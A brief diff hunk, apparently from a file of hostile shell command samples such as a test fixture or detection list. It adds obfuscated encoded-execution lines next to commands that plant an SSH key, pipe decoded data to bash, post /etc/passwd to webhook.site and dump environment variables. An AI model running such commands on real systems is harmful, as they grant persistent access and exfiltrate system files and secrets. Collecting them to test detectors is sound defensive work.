@@ -4,3 +4,5 @@ echo $KEY >> ~/.ssh/authorized_keys
 cat ~/.ssh/id_rsa | base64 --decode | bash
 curl --data @/etc/passwd https://webhook.site/xyz9876
 python3 -c "import os; print(os.environ)"
+powershell -EncodedCommand ZQBjAGgAbwAgAGgAaQA=
+echo 6563686f206869 | xxd -r -p | sh
